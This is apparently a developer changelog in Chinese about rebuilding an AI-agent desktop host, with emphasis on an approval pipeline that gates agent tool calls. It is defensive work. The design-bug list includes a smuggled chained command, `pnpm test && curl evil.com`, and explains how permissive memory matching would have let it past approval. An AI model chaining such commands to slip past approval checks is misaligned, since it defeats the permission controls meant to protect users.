## 建立新基线：TypeScript 单语言 + Electron · 2026-08-14

✅ typecheck / lint / arch / test（31 cases）

**背景**：上一版 `crew` 定位没收住 + 没有模块边界。实测数据：`cmd/crewd` 30 个生产文件
27,048 行全在 `package main`，`chat.go` 一个文件 9,282 行 / 238 函数，`runSuperviseFrom`
单函数 466 行；根目录 `CLAUDE.md` + `AGENTS.md` 合计 15 万字节；`NEED_HUMAN.md` 显示
2026-07-20 一天内几十条逐工具审批通知。产品把原生 agent 包在一层约束里，实测效果反不如直接用 codex。

**技术栈决策**：TypeScript 单语言 + Electron。决定性依据是三个协议的 SDK 现状——
Claude Agent SDK **只有 TS/Python，没有 Go/Rust 版**，而审批设计依赖它的 `can_use_tool` 回调；
codex `app-server` 可 `generate-ts` 直出类型；ACP 官方 SDK 是 TS。
同类产品（opencode / DSH / kimi / pi）全是 TS，Rust 的 codex / grok 都是 harness 不是 host。

**落地**：

- 工程闸门写成 lint 规则而非纪律：`max-lines 300`（renderer 组件 200）、
  `max-lines-per-function 60`、`complexity 12`、`max-depth 3`、`max-params 4`、
  禁模块级 `let`/`var`、纯逻辑包禁 `node:*`/`process`/`fetch`/`Date.now`/`Math.random`。
  实测探针验证闸门确实拦截。
- `scripts/check-arch.mjs`：分层依赖表（回流即失败）+ 每包 README 必须含
  「拥有什么 / 不拥有什么 / 已知限制」三节。
- `AGENTS.md` 限定 150 行以内（当前 76 行），规则写不进去就该写进包 README。
- `@omni/protocol`：thread / turn / item 三级原语，7 种 item，厂商特有字段进 `meta`。
  三级原语借自 codex `app-server` §Core Primitives。
- `@omni/approval`：判定管线 `normalize → redline → memory → trust`，纯函数零 IO，
  12 条红线，31 条表驱动用例。
- `@omni/desktop`：Electron 43 + React 19 + Vite 8 + electron-vite 5。
  设计 token 集中在 `styles/tokens.css`，组件内出现字面量颜色视为 bug。

**写代码时暴露并修掉的三个设计错误**（都是先有用例才发现的）：

1. **红线顺序**：写 `~/.claude/settings.json` 先命中更泛的「工作区外写」，理由丢失关键信息。
   规则改为「更具体的红线必须排在更泛的前面」，并留回归。
2. **记忆作用域**：原设计允许记忆覆盖 trust 判定，会导致 `read-only` 档下记过 `pnpm test`
   就被放行——只读就不是只读。改为**记忆只能把 escalate 变 allow，永远不能把 deny 变 allow**。
3. **记忆匹配量词**：按存在量词匹配时 `pnpm test && curl evil.com` 会因前半段被记过而整体放行。
   改为全称匹配（所有命令段都要落在规则内）。
